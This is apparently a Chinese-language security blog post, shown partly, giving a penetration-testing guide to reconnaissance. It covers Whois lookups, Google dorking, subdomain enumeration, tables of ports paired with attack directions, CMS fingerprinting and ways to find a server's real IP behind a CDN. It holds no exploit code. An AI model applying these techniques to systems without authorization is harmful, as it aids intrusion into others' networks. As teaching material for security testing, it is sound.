<meta property="og:image" content="https://gitee.com/wxpgitee/images/raw/master/img/image-20210712151813582.png">
<meta property="og:image" content="https://gitee.com/wxpgitee/images/raw/master/img/image-20210712152041516.png">
<meta property="og:image" content="https://gitee.com/wxpgitee/images/raw/master/img/image-20210712152853158.png">
<meta property="og:image" content="https://gitee.com/wxpgitee/images/raw/master/img/image-20210720151235142.png">
<meta property="og:image" content="https://gitee.com/wxpgitee/images/raw/master/img/image-20210712153604147.png">
<meta property="og:image" content="https://gitee.com/wxpgitee/images/raw/master/img/image-20210720084923856.png">
<meta property="og:image" content="https://gitee.com/wxpgitee/images/raw/master/img/image-20210720081843645.png">
<meta property="og:image" content="https://gitee.com/wxpgitee/images/raw/master/img/image-20210720082326714.png">
<meta property="og:image" content="https://gitee.com/wxpgitee/images/raw/master/img/image-20210720082512378.png">
<meta property="og:image" content="https://gitee.com/wxpgitee/images/raw/master/img/image-20210720083528417.png">
<meta property="og:image" content="https://gitee.com/wxpgitee/images/raw/master/img/image-20210720083616214.png">
<meta property="og:image" content="https://gitee.com/wxpgitee/images/raw/master/img/image-20210720090839879.png">
<meta property="og:image" content="https://gitee.com/wxpgitee/images/raw/master/img/image-20210720093919235.png">
<meta property="og:image" content="https://gitee.com/wxpgitee/images/raw/master/img/image-20210720094535283.png">
<meta property="og:image" content="https://gitee.com/wxpgitee/images/raw/master/img/image-20210720095309360.png">
<meta property="og:image" content="https://gitee.com/wxpgitee/images/raw/master/img/image-20210721150349958.png">
<meta property="og:image" content="https://gitee.com/wxpgitee/images/raw/master/img/image-20210721150652502.png">
<meta property="og:image" content="https://gitee.com/wxpgitee/images/raw/master/img/image-20210721150732626.png">
<meta property="og:image" content="https://gitee.com/wxpgitee/images/raw/master/img/image-20210723210020294.png">
<meta property="og:image" content="https://gitee.com/wxpgitee/images/raw/master/img/image-20210723210304048.png">
<meta property="og:image" content="https://gitee.com/wxpgitee/images/raw/master/img/image-20210723211613049.png">
<meta property="og:image" content="https://gitee.com/wxpgitee/images/raw/master/img/image-20210723212258604.png">
<meta property="og:image" content="https://gitee.com/wxpgitee/images/raw/master/img/image-20210723212429215.png">
<meta property="og:image" content="https://gitee.com/wxpgitee/images/raw/master/img/image-20210728212245425.png">
<meta property="og:image" content="https://gitee.com/wxpgitee/images/raw/master/img/image-20210728211322570.png">
<meta property="og:image" content="https://gitee.com/wxpgitee/images/raw/master/img/image-20210729082800181.png">
<meta property="og:image" content="https://gitee.com/wxpgitee/images/raw/master/img/image-20210729085554337.png">
<meta property="og:image" content="https://gitee.com/wxpgitee/images/raw/master/img/image-20210729085808503.png">
<meta property="og:image" content="https://gitee.com/wxpgitee/images/raw/master/img/image-20210729090246013.png">
<meta property="og:image" content="https://gitee.com/wxpgitee/images/raw/master/img/image-20210729090717689.png">
<meta property="article:published_time" content="2021-05-12T09:37:19.000Z">
<meta property="article:modified_time" content="2021-07-29T01:09:09.348Z">
<meta property="article:author" content="IdeFun">
<meta property="article:tag" content="Hack">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://i.loli.net/2021/05/12/tvUKdMEkLob1z96.png">

<link rel="canonical" href="http://www.idefun.com/article/8240bef7.html">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : false,
    isPost : true,
    lang   : 'zh-CN'
  };
</script>
<script> 
    (function(){
        if(''){
            if (prompt('请输入文章密码') !== ''){
                alert('密码错误！');
                history.back();
            }
        }
    })();
</script>

  <title>渗透测试实战指南 | IdeFun</title>
  
    <script async src="https://www.googletagmanager.com/gtag/js?id=G-Y0WRGPLW2R"></script>
    <script>
      if (CONFIG.hostname === location.hostname) {
        window.dataLayer = window.dataLayer || [];
        function gtag(){dataLayer.push(arguments);}
        gtag('js', new Date());
        gtag('config', 'G-Y0WRGPLW2R');
      }
    </script>


  <script>
    var _hmt = _hmt || [];
    (function() {
      var hm = document.createElement("script");
      hm.src = "https://hm.baidu.com/hm.js?f3e54559a18afd6cd8a648ff0740cc8b";
      var s = document.getElementsByTagName("script")[0];
      s.parentNode.insertBefore(hm, s);
    })();
  </script>




  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

<link rel="alternate" href="/atom.xml" title="IdeFun" type="application/atom+xml">
</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">IdeFun</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
      <p class="site-subtitle" itemprop="description">暗透了,更能看得见星光</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>

  </li>
        <li class="menu-item menu-item-photos">

    <a href="/photos/" rel="section"><i class="fas fa-camera-retro fa-fw"></i>相册</a>

  </li>
        <li class="menu-item menu-item-schedule">

    <a href="/schedule/" rel="section"><i class="fa fa-calendar fa-fw"></i>日程</a>

  </li>
        <li class="menu-item menu-item-navigation">

    <a href="https://navi.idefun.com/" rel="noopener external nofollow noreferrer" target="_blank"><i class="fa fa-paper-plane fa-fw"></i>导航</a>

  </li>
        <li class="menu-item menu-item-links">

    <a href="/links/" rel="section"><i class="fa fa-link fa-fw"></i>友链</a>

  </li>
        <li class="menu-item menu-item-language">

    <a href="https://en.idefun.com/" rel="noopener external nofollow noreferrer" target="_blank"><i class="fa fa-language fa-fw"></i>English</a>

  </li>
        <li class="menu-item menu-item-guestbook">

    <a href="/guestbook/" rel="section"><i class="fa fa-book fa-fw"></i>留言板</a>

  </li>
        <li class="menu-item menu-item-about">

    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>

  </li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup">
        <div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocapitalize="off"
           placeholder="搜索..." spellcheck="false"
           type="search" class="search-input">
  </div>
  <span class="popup-btn-close">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div id="search-result">
  <div id="no-result">
    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
  </div>
</div>

    </div>
  </div>

</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>
  <div class="reading-progress-bar"></div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content post posts-expand">
            

    
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://www.idefun.com/article/8240bef7.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="https://i.loli.net/2021/01/05/Gf1qZ9szBp7tISF.jpg">
      <meta itemprop="name" content="IdeFun">
      <meta itemprop="description" content="IdeFun的小破站,记录生活,分享知识">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="IdeFun">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          渗透测试实战指南
        </h1>

        <div class="post-meta">

          
            <i class="fa fa-thumb-tack"></i>
            <font color=7D26CD>置顶</font>
            <span class="post-meta-divider">|</span>
          
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2021-05-12 17:37:19" itemprop="dateCreated datePublished" datetime="2021-05-12T17:37:19+08:00">2021-05-12</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2021-07-29 09:09:09" itemprop="dateModified" datetime="2021-07-29T09:09:09+08:00">2021-07-29</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Hack/" itemprop="url" rel="index"><span itemprop="name">Hack</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
              <span class="post-meta-item-icon">
                <i class="fa fa-eye"></i>
              </span>
              <span class="post-meta-item-text">阅读次数：</span>
              <span id="busuanzi_value_page_pv"></span>
            </span>
  
  <span class="post-meta-item">
    
      <span class="post-meta-item-icon">
        <i class="far fa-comment"></i>
      </span>
      <span class="post-meta-item-text">Valine：</span>
    
    <a title="valine" href="/article/8240bef7.html#valine-comments" itemprop="discussionUrl">
      <span class="post-comments-count valine-comment-count" data-xid="/article/8240bef7.html" itemprop="commentCount"></span>
    </a>
  </span>
  
  <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>35k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>32 分钟</span>
            </span>
            <div class="post-description">渗透测试实战指南</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
        <h1 id="渗透测试实战指南"><a href="#渗透测试实战指南" class="headerlink" title="渗透测试实战指南"></a>渗透测试实战指南</h1><a id="more"></a>
<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>进行渗透测试之前,最重要的一步就是信息收集,在这个阶段,我们要尽可能地收集目标组织的信息.所谓“知己知彼,百战不殆”,我们越是了解测试目标,测试的工作就越容易.在信息收集中,最主要的就是收集服务器的配置信息和网站的敏感信息,其中包括域名及子域名信息、目标网站系统、CMS指纹、目标网站真实IP、开放的端口等.换句话说,只要是与目标网站相关的信息,我们都应该去尽量搜集.</p>
<h3 id="收集域名信息"><a href="#收集域名信息" class="headerlink" title="收集域名信息"></a>收集域名信息</h3><p>知道目标的域名之后,我们要做的第一件事就是获取域名的注册信息,包括该域名的DNS服务器信息和注册人的联系信息等.</p>
<h4 id="Whois查询"><a href="#Whois查询" class="headerlink" title="Whois查询"></a>Whois查询</h4><p>Whois是一个标准的互联网协议,可用于收集网络注册信息,注册的域名、IP地址等信息.简单来说,Whois就是一个用于查询域名是否已被注册以及注册域名的详细信息的数据库(如域名所有人、域名注册商).在Whois查询中,得到注册人的姓名和邮箱信息通常对测试个人站点非常有用,因为我们可以通过搜索引擎和社交网络挖掘<br>出域名所有人的很多信息.对中小站点而言,域名所有人往往就是管理员.<br>在Kali系统中,Whois已经默认安装,只需输入要查询的域名即可.</p>
<p><img src="https://i.loli.net/2021/05/12/tvUKdMEkLob1z96.png" alt=""></p>
<p>在线Whois查询的常用网站有爱站工具网(<a target="_blank" rel="noopener external nofollow noreferrer" href="https://whois.aizhan.com)和站长之家(http://whois.chinaz.com)通过这些网站可以查询域名的相关信息,如域名服商、域名拥有者,以及他们的邮箱、电话、地址等">https://whois.aizhan.com)和站长之家(http://whois.chinaz.com)通过这些网站可以查询域名的相关信息,如域名服商、域名拥有者,以及他们的邮箱、电话、地址等</a>.</p>
<h4 id="备案查询"><a href="#备案查询" class="headerlink" title="备案查询"></a>备案查询</h4><p>网站备案是根据国家法律法规规定,需要网站的所有者向国家有关部门申请的备案,这是国家信息产业部对网站的一种管理,为了防止在网上从事非法的网站经营活动的发生.主要针对国内网站,如果网站搭建在其他国家,则不需要进行备案.</p>
<p>常用的网站有以下这两个:</p>
<ul>
<li>站长工具: <a target="_blank" rel="noopener external nofollow noreferrer" href="http://icp.chinaz.com/">http://icp.chinaz.com/</a></li>
<li>天眼查: <a target="_blank" rel="noopener external nofollow noreferrer" href="http://www.tianyancha.com/">http://www.tianyancha.com/</a></li>
</ul>
<h3 id="收集敏感信息"><a href="#收集敏感信息" class="headerlink" title="收集敏感信息"></a>收集敏感信息</h3><p>Google是世界上最强的搜索引擎之一,对一位渗透测试者而言,它可能是一款绝佳的黑客工具.我们可以通过构造特殊的关键字语法来搜索互联网上的相关敏感信息.</p>
<div class="table-container">
<table>
<thead>
<tr>
<th>关键字</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>site</td>
<td>指定域名</td>
</tr>
<tr>
<td>inurl</td>
<td>URL中存在关键字的网页</td>
</tr>
<tr>
<td>intext</td>
<td>网页正文中的关键字</td>
</tr>
<tr>
<td>filetype</td>
<td>指定文件类型</td>
</tr>
<tr>
<td>intitle</td>
<td>网页标题中的关键字</td>
</tr>
<tr>
<td>link</td>
<td>link:baidu.com即表示返回所有和baidu.com做了链接的URL</td>
</tr>
<tr>
<td>info</td>
<td>查找指定站点的一些基本信息</td>
</tr>
<tr>
<td>cache</td>
<td>搜索Google里关于某些内容的缓存</td>
</tr>
</tbody>
</table>
</div>
<p>利用Google搜索,我们可以很轻松地得到想要的信息,还可以用它来收集数据库文件、SQL注入、配置信息、源代码泄露、未授权访问和robots.txt等敏感信息.</p>
<p>当然,不仅是Google搜索引擎,这种搜索思路还可以用在百度、雅虎、Bing、<a target="_blank" rel="noopener external nofollow noreferrer" href="https://www.shodan.io/">Shodan</a>等搜索引擎上,其语法也大同小异.</p>
<p>另外,通过Burp Suite的Repeater功能同样可以获取一些服务器的信息,如运行的Server类型及版本、PHP的版本信息等.针对不同的Server,可以利用不同的漏洞进行测试.</p>
<p>除此之外,也可以尝试在GitHub上寻找相关敏感信息,如数据库连接信息、邮箱密码、uc-key、阿里的osskey,有时还可以找到泄露的源代码等.</p>
<h3 id="收集子域名信息"><a href="#收集子域名信息" class="headerlink" title="收集子域名信息"></a>收集子域名信息</h3><p>子域名也就是二级域名,是指顶级域名下的域名.假设我们的目标网络规模比较大，直接从主域入手显然是很不理智的,因为对于这种规模的目标,一般其主域都是重点防护区域,所以不如先进入目标的某个子域,然后再想办法迂回接近真正的目标,这无疑是个比较好的选择.</p>
<h4 id="1-子域名检测工具"><a href="#1-子域名检测工具" class="headerlink" title="1.子域名检测工具"></a>1.子域名检测工具</h4><p>用于子域名检测的工具主要有<strong>Layer子域名挖掘机</strong>、K8、wydomain、<strong>Sublist3r</strong>、dnsmaper、<strong>subDomainsBrute</strong>、Maltego CE等.</p>
<h4 id="2-搜索引擎枚举"><a href="#2-搜索引擎枚举" class="headerlink" title="2.搜索引擎枚举"></a>2.搜索引擎枚举</h4><p>可利用搜索引擎相关语法搜索子域名</p>
<h4 id="3-第三方聚合应用枚举"><a href="#3-第三方聚合应用枚举" class="headerlink" title="3.第三方聚合应用枚举"></a>3.第三方聚合应用枚举</h4><p>很多第三方服务汇聚了大量DNS数据集,可通过它们检索某个给定域名的子域名.只需在其搜索栏中输入域名,就可检索到相关的域名信息.</p>
<p>读者也可以利用DNSdumpster网站(<a target="_blank" rel="noopener external nofollow noreferrer" href="https://dnsdumpster.com/)、在线DNS侦查和搜索的工具挖掘出指定域潜藏的大量子域">https://dnsdumpster.com/)、在线DNS侦查和搜索的工具挖掘出指定域潜藏的大量子域</a>.</p>
<h4 id="4-证书透明度公开日志枚举"><a href="#4-证书透明度公开日志枚举" class="headerlink" title="4.证书透明度公开日志枚举"></a>4.证书透明度公开日志枚举</h4><p>证书透明度(Certificate Transparency, CT)是证书授权机构(CA)的一个项目,证书授权机构会将每个SSL/TLS证书发布到公共日志中.一个SSL/TLS证书通常包含域名、子域名和邮件地址,这些也经常成为攻击者非常希望获得的有用信息.查找某个域名所属证书的最简单的方法就是使用搜索引擎搜索一些公开的CT日志.</p>
<h3 id="收集常用端口信息"><a href="#收集常用端口信息" class="headerlink" title="收集常用端口信息"></a>收集常用端口信息</h3><p>在渗透测试的过程中,对端口信息的收集是一个很重要的过程,通过扫描服务器开放的端口以及从该端口判断服务器上存在的服务,就可以对症下药,便于我们渗透目标服务器.</p>
<p>所以在端口渗透信息的收集过程中,我们需要关注常见应用的默认端口和在端口上运行的服务.最常见的扫描工具就是Nmap、无状态端口扫描工具Masscan、ZMap和御剑高速TCP端口扫描工具.</p>
<p>常见的端口及其说明,以及攻击方向汇总如下：</p>
<h4 id="文件共享服务端口"><a href="#文件共享服务端口" class="headerlink" title="文件共享服务端口"></a>文件共享服务端口</h4><div class="table-container">
<table>
<thead>
<tr>
<th>端口</th>
<th>端口说明</th>
<th>攻击方向</th>
</tr>
</thead>
<tbody>
<tr>
<td>21/22/69</td>
<td>Ftp/<a target="_blank" rel="noopener external nofollow noreferrer" href="https://www.cnblogs.com/qinlulu/p/13204788.html">Tftp</a>文件传输协议</td>
<td>允许匿名的上传、下载、爆破和嗅探操作</td>
</tr>
<tr>
<td>2049</td>
<td><a target="_blank" rel="noopener external nofollow noreferrer" href="https://baike.baidu.com/item/%E7%BD%91%E7%BB%9C%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F/9719420?fromtitle=NFS&amp;fromid=812203">Nfs</a>服务</td>
<td>配置不当</td>
</tr>
<tr>
<td>139</td>
<td><a target="_blank" rel="noopener external nofollow noreferrer" href="https://baike.baidu.com/item/samba/455025">Samba</a>服务</td>
<td>爆破、未授权访问、远程代码执行</td>
</tr>
<tr>
<td>389</td>
<td><a target="_blank" rel="noopener external nofollow noreferrer" href="https://baike.baidu.com/item/%E8%BD%BB%E5%9E%8B%E7%9B%AE%E5%BD%95%E8%AE%BF%E9%97%AE%E5%8D%8F%E8%AE%AE/10493115?fromtitle=LDAP&amp;fromid=2875565">Ldap</a>轻型目录访问协议</td>
<td>注入、允许匿名访问、弱口令</td>
</tr>
</tbody>
</table>
</div>
<h4 id="远程连接服务端口"><a href="#远程连接服务端口" class="headerlink" title="远程连接服务端口"></a>远程连接服务端口</h4><div class="table-container">
<table>
<thead>
<tr>
<th>端口</th>
<th>端口说明</th>
<th>攻击方向</th>
</tr>
</thead>
<tbody>
<tr>
<td>22</td>
<td>SSH远程连接</td>
<td>爆破、SSH隧道及内网代理转发、文件传输</td>
</tr>
<tr>
<td>23</td>
<td>Telnet远程连接</td>
<td>爆破、嗅探、弱口令</td>
</tr>
<tr>
<td>3389</td>
<td><a target="_blank" rel="noopener external nofollow noreferrer" href="https://baike.baidu.com/item/%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2%E5%8D%8F%E8%AE%AE/9978980?fromtitle=RDP&amp;fromid=2986499">Rdp</a>远程桌面连接</td>
<td><a target="_blank" rel="noopener external nofollow noreferrer" href="https://blog.csdn.net/Auuuuuuuu/article/details/88902791">Shift后门</a>(需要Windows Server 2003以下的系统)、爆破</td>
</tr>
<tr>
<td>5900</td>
<td>VNC</td>
<td>弱口令爆破</td>
</tr>
<tr>
<td>5632</td>
<td><a target="_blank" rel="noopener external nofollow noreferrer" href="https://baike.baidu.com/item/pcAnywhere/866833">PyAnywhere</a>服务</td>
<td>抓密码、代码执行</td>
</tr>
</tbody>
</table>
</div>
<h4 id="web应用服务端口"><a href="#web应用服务端口" class="headerlink" title="web应用服务端口"></a>web应用服务端口</h4><div class="table-container">
<table>
<thead>
<tr>
<th>端口</th>
<th>端口说明</th>
<th>攻击方向</th>
</tr>
</thead>
<tbody>
<tr>
<td>80/443/8080</td>
<td>常见的Web服务端口</td>
<td>Web攻击、爆破、对应服务器版本漏洞</td>
</tr>
<tr>
<td>7001/7002</td>
<td><a target="_blank" rel="noopener external nofollow noreferrer" href="https://baike.baidu.com/item/weblogic">WebLogic</a>控制台</td>
<td>Java反序列化、弱口令</td>
</tr>
<tr>
<td>8080/8089</td>
<td>Jboss/Resin/Jetty/Jenkins</td>
<td>反序列化、控制台弱口令</td>
</tr>
<tr>
<td>9090</td>
<td>WebSphere控制台</td>
<td>Java反序列化、弱口令</td>
</tr>
<tr>
<td>4848</td>
<td>GlassFish控制台</td>
<td>弱口令</td>
</tr>
<tr>
<td>1352</td>
<td>Lotus domino邮件服务</td>
<td>弱口令、信息泄露、爆破</td>
</tr>
<tr>
<td>10000</td>
<td>Webmin-Web控制面板</td>
<td>弱口令</td>
</tr>
</tbody>
</table>
</div>
<h4 id="数据库服务端口"><a href="#数据库服务端口" class="headerlink" title="数据库服务端口"></a>数据库服务端口</h4><div class="table-container">
<table>
<thead>
<tr>
<th>端口</th>
<th>端口说明</th>
<th>攻击方向</th>
</tr>
</thead>
<tbody>
<tr>
<td>3306</td>
<td>MySQL</td>
<td>注入、提权、爆破</td>
</tr>
<tr>
<td>1433</td>
<td>MSSQL数据库</td>
<td>注入、提权、SA弱口令、爆破</td>
</tr>
<tr>
<td>1521</td>
<td>Oracle数据库</td>
<td>TNS爆破、注入、反弹Shell</td>
</tr>
<tr>
<td>5432</td>
<td>PostgreSQL数据库</td>
<td>爆破、注入、弱口令</td>
</tr>
<tr>
<td>27017/27018</td>
<td>MongoDB</td>
<td>爆破、未授权访问</td>
</tr>
<tr>
<td>6379</td>
<td>Redis数据库</td>
<td>可尝试未授权访问、弱口令爆破</td>
</tr>
<tr>
<td>5000</td>
<td>SysBase/DB2数据库</td>
<td>爆破、注入</td>
</tr>
</tbody>
</table>
</div>
<h4 id="邮件服务端口"><a href="#邮件服务端口" class="headerlink" title="邮件服务端口"></a>邮件服务端口</h4><div class="table-container">
<table>
<thead>
<tr>
<th>端口</th>
<th>端口说明</th>
<th>攻击方向</th>
</tr>
</thead>
<tbody>
<tr>
<td>25</td>
<td>SMTP邮件服务</td>
<td>邮件伪造</td>
</tr>
<tr>
<td>110</td>
<td>POP3协议</td>
<td>爆破、嗅探</td>
</tr>
<tr>
<td>143</td>
<td>IMAP协议</td>
<td>爆破</td>
</tr>
</tbody>
</table>
</div>
<h4 id="网络常见协议端口"><a href="#网络常见协议端口" class="headerlink" title="网络常见协议端口"></a>网络常见协议端口</h4><div class="table-container">
<table>
<thead>
<tr>
<th>端口</th>
<th>端口说明</th>
<th>攻击方向</th>
</tr>
</thead>
<tbody>
<tr>
<td>53</td>
<td>DNS域名系统</td>
<td>允许区域传送、DNS劫持、缓存投毒、欺骗</td>
</tr>
<tr>
<td>67/68</td>
<td>DHCP服务</td>
<td>劫持、欺骗</td>
</tr>
<tr>
<td>161</td>
<td>SNMP协议</td>
<td>爆破、搜集目标内网信息</td>
</tr>
</tbody>
</table>
</div>
<h4 id="特殊服务端口"><a href="#特殊服务端口" class="headerlink" title="特殊服务端口"></a>特殊服务端口</h4><div class="table-container">
<table>
<thead>
<tr>
<th>端口</th>
<th>端口说明</th>
<th>攻击方向</th>
</tr>
</thead>
<tbody>
<tr>
<td>2181</td>
<td>Zookeeper服务</td>
<td>未授权访问</td>
</tr>
<tr>
<td>8069</td>
<td>Zabbix服务</td>
<td>远程执行、SQL注入</td>
</tr>
<tr>
<td>9200/9300</td>
<td>Elasticsearch服务</td>
<td>远程执行</td>
</tr>
<tr>
<td>11211</td>
<td>Memcache服务</td>
<td>未授权访问</td>
</tr>
<tr>
<td>512/513/514</td>
<td>Linux Rexee服务</td>
<td>爆破、Rlogin登录</td>
</tr>
<tr>
<td>873</td>
<td>Rsync服务</td>
<td>匿名访问、文件上传</td>
</tr>
<tr>
<td>3690</td>
<td>Svn服务</td>
<td>Svn泄露、未授权访问</td>
</tr>
<tr>
<td>50000</td>
<td>SAP Management Console</td>
<td>远程执行</td>
</tr>
</tbody>
</table>
</div>
<h3 id="指纹识别"><a href="#指纹识别" class="headerlink" title="指纹识别"></a>指纹识别</h3><p>此处所说的指纹是指网站CMS指纹识别、计算机操作系统及Web容器的指纹识别等。</p>
<p>应用程序一般在html、js、 css等文件中多多少少会包含一些特征码，比如WordPress在robots.txt中会包含wp-admin、首页index.php中会包含generator-=wordpress 3.xx,，这个特征就是这个CMS的指纹，那么当碰到其他网站也存在此特征时，就可以快速识别出该CMS,所以叫作指纹识别。</p>
<p>在渗透测试中，对目标服务器进行指纹识别是相当有必要的，因为只有识别出相应的Web容器或者CMS，才能查找与其相关的漏洞，然后才能进行相应的渗透操作。</p>
<p>CMS(Content Management System)又称整站系统或文章系统。常见的CMS有Dedecms (织梦)、Discuz、 PHPWEB、 PHPWind、PHPCMS、ECShop、Dvbbs、 SiteWeaver、 ASPCMS、帝国、Z- Blog、WordPress等。</p>
<p>代表工具有御剑Web指纹识别、WhatWeb、 WebRobo、 椰树、轻量WEB指纹识别等，可以快速识别一些主流CMS。</p>
<p>除了这些工具，还可以利用一些在线网站查询CMS指纹识别:</p>
<ul>
<li>BugScaner: <a target="_blank" rel="noopener external nofollow noreferrer" href="http://whatweb.bugscaner.com/look/">http://whatweb.bugscaner.com/look/</a></li>
<li>云悉指纹: <a target="_blank" rel="noopener external nofollow noreferrer" href="http://www.yunsee.cn/finger.html">http://www.yunsee.cn/finger.html</a></li>
</ul>
<h3 id="查找真实IP"><a href="#查找真实IP" class="headerlink" title="查找真实IP"></a>查找真实IP</h3><p>在渗透测试过程中，目标服务器可能只有一个域名，那么如何通过这个域名来确定目标服务器的真实IP对渗透测试来说就很重要。如果目标服务器不存在CDN,可以直接通过<a target="_blank" rel="noopener external nofollow noreferrer" href="http://www.ip138.com">ip138</a>获取目标的一些IP及域名信息。这里主要讲解在以下这几种情况下，如何绕过CDN寻找目标服务器的真实IP。</p>
<h4 id="1-目标服务器存在CDN"><a href="#1-目标服务器存在CDN" class="headerlink" title="1.目标服务器存在CDN"></a>1.目标服务器存在CDN</h4><p>CDN即内容分发网络，主要解决因传输距离和不同运营商节点造成的网络速度性能低下的问题。说得简单点，就是一组在不同运营商之间的对接节点上的高速缓存服务器，把用户经常访问的静态数据资源(例如静态的html、css、js图片等文件)直接缓存到节点服务器上，当用户再次请求时，会直接分发到在离用户近的节点服务器上响应给用户，当用户有实际数据交互时才会从远程Web服务器上响应，这样可以大大提高网站的响应速度及用户体验。</p>
<p>所以如果渗透目标购买了CDN服务，可以直接ping目标的域名，但得到的并非真正的目标Web服务器，只是离我们最近的一台目标节点的CDN服务器，这就导致了我们没法直接得到目标的真实IP段范围。</p>
<h4 id="2-判断目标是否使用了CDN"><a href="#2-判断目标是否使用了CDN" class="headerlink" title="2.判断目标是否使用了CDN"></a>2.判断目标是否使用了CDN</h4><p>通常会通过ping目标主域，观察域名的解析情况，以此来判断其是否使用了<br>CDN.</p>
<p>还可以利用在线网站<a target="_blank" rel="noopener external nofollow noreferrer" href="https://www.17ce.com">17CE</a>进行全国多地区的ping服务器操作，然后对比每个地区ping出的IP结果，查看这些IP是否一致，如果都是一样的，极有可能不存在CDN。如果IP大多不太一样或者规律性很强，可以尝试查询这些IP的归属地，判断是否存在CDN。</p>
<h4 id="3-绕过CDN寻找真实IP"><a href="#3-绕过CDN寻找真实IP" class="headerlink" title="3.绕过CDN寻找真实IP"></a>3.绕过CDN寻找真实IP</h4><p>在确认了目标确实用了CDN以后，就需要绕过CDN寻找目标的真实IP，下面介绍一些常规的方法。</p>
<ul>
<li>内部邮箱源。一般的邮件系统都在内部，没有经过CDN的解析，通过目标网站用户注册或者RSS订阅功能，查看邮件、寻找邮件头中的邮件服务器域名IP，ping这个邮件服务器的域名，就可以获得目标的真实IP(注意，必须是目标自己的邮件服务器，第三方或公共邮件服务器是没有用的)</li>
<li>扫描网站测试文件.如phpinfo、test等,从而找到目标的真实IP。</li>
<li>分站域名。很多网站主站的访问量会比较大，所以主站都是挂CDN的，但是分站可能没有挂CDN，可以通过ping二级域名获取分站IP，可能会出现分站和主站不是同一个IP但在同一个C段下面的情况，从而能判断出目标的真实IP段。</li>
<li>国外访问。国内的CDN往往只对国内用户的访问加速，而国外的CDN就不<br>一定了。因此，通过国外在线代理网站<a target="_blank" rel="noopener external nofollow noreferrer" href="https://asm.ca.com/en/ping.php">App Synthetic Monitor</a>访问，可能会得到真实的IP</li>
<li>查询域名的解析记录。也许目标很久以前并没有用过CDN，所以可以通过<br>网站<a target="_blank" rel="noopener external nofollow noreferrer" href="https://www.netcraft.com/">NETCRAFT</a>来观察域名的IP历史记录，也可以大致分析出目标的真实IP段。</li>
<li>如果目标网站有自己的App,可以尝试利用Fiddler或Burp Suite抓取App的<br>请求，从里面找到目标的真实IP。</li>
